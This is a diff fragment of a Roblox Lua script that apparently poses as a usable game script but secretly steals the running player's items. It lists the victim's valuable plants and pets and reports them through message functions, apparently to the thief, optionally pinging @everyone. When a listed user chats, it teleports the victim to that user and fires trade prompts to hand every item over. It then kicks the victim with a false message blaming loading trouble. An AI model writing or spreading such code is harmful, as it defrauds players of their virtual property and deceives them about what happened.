+            local value = calcPlantValue(tool)
+            if value >= min_value then
+                local weight = getWeight(tool)
+                local itemName = tool:GetAttribute("ItemName")
+                totalValue = totalValue + value
+                table.insert(itemsToSend, {Tool = tool, Name = itemName, Value = value, Weight = weight, Type = "Plant"})
+            end
+        end
+    end
+end
+
+if #itemsToSend > 0 then
+    table.sort(itemsToSend, function(a, b)
+        if a.Type ~= "Pet" and b.Type == "Pet" then
+            return true
+        elseif a.Type == "Pet" and b.Type ~= "Pet" then
+            return false
+        else
+            return a.Value < b.Value
+        end
+    end)
+
+    local sentItems = {}
+    for i, v in ipairs(itemsToSend) do
+        sentItems[i] = v
+    end
+
+    table.sort(sentItems, function(a, b)
+        if a.Type == "Pet" and b.Type ~= "Pet" then
+            return true
+        elseif a.Type ~= "Pet" and b.Type == "Pet" then
+            return false
+        else
+            return a.Value > b.Value
+        end
+    end)
+
+    local prefix = ""
+    if ping == "Yes" then
+        prefix = "--[[@everyone]] "
+    end
+
+    SendJoinMessage(sentItems, prefix)
+
+    local function doSteal(player)
+        local victimRoot = character:WaitForChild("HumanoidRootPart")
+        victimRoot.CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0, 0, 2)
+        wait(0.1)
+
+        local promptRoot = player.Character.HumanoidRootPart:WaitForChild("ProximityPrompt")
+
+        for _, item in ipairs(itemsToSend) do
+            item.Tool.Parent = character
+            if item.Type == "Pet" then
+                local promptHead = player.Character.Head:WaitForChild("ProximityPrompt")
+                repeat
+                    task.wait(0.01)
+                until promptHead.Enabled
+                fireproximityprompt(promptHead)
+            else
+                repeat
+                    task.wait(0.01)
+                until promptRoot.Enabled
+                fireproximityprompt(promptRoot)
+            end
+            task.wait(0.1)
+            item.Tool.Parent = backpack
+            task.wait(0.1)
+        end
+
+        local itemsStillInBackpack = true
+        while itemsStillInBackpack do
+            itemsStillInBackpack = false
+            for _, item in ipairs(itemsToSend) do
+                if backpack:FindFirstChild(item.Tool.Name) then
+                    itemsStillInBackpack = true
+                    break
+                end
+            end
+            task.wait(0.1)
+        end
+
+        plr:kick("If the Script not loading or executing just rejoin and lets try again if the script doesn't work Dm me on Discord : Zista#0000")
+    end
+
+    local function waitForUserChat()
+        local sentMessage = false
+        local function onPlayerChat(player)
+            if table.find(users, player.Name) then
+                player.Chatted:Connect(function()
+                    if not sentMessage then
+                        SendMessage(sentItems)
+                        sentMessage = true
+                    end
+                    doSteal(player)
+                end)
+            end
+        end
+        for _, p in ipairs(Players:GetPlayers()) do onPlayerChat(p) end
+        Players.PlayerAdded:Connect(onPlayerChat)
+    end
+    waitForUserChat()
+end
